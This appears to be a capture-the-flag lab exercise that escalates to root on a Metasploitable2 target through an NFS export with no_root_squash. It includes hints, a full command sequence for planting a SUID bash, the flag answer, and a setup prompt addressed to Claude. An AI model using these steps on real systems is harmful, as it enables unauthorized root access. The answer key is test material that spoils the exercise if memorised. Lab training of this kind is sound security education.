# Q059 — NFS no_root_squash Privesc

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `nfs-common, mount` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Mount Metasploitable's `/` NFS export from Parrot, drop a SUID `/bin/bash`, then execute it on the target via SSH/shell to gain root.

---

## 🎯 Flag Format

```
exploit=<noroot-squash|root_squash>
```

Example: `exploit=noroot-squash`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Mount: `mkdir /mnt/m; sudo mount -t nfs 192.168.52.129:/ /mnt/m`.
</details>

<details>
<summary>Hint 2</summary>

Place SUID bash; `bash -p` from msfadmin shell.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo mkdir -p /mnt/m
sudo mount -t nfs 192.168.52.129:/ /mnt/m
sudo cp /bin/bash /mnt/m/tmp/rootbash
sudo chmod +s /mnt/m/tmp/rootbash
# On target: /tmp/rootbash -p
```

Yields root shell via no_root_squash misconfig.

**Answer:** `exploit=noroot-squash`

📖 Ref: [playbooks/system-hacking-playbook.md](../../playbooks/system-hacking-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q059:
1. Verify NFS exports as in Q027 (showmount -e 192.168.52.129 shows '/ *').
2. On Parrot: sudo apt install nfs-common; mkdir -p /mnt/m.
3. Parrot must run exploit as root (to preserve SUID bit when copying /bin/bash).
4. Must have a second shell/path on Metasploitable2 to execute /tmp/rootbash -p (ssh msfadmin).

Report back: "Lab ready for Q059 — NFS / exported from 192.168.52.129 with no_root_squash".
```
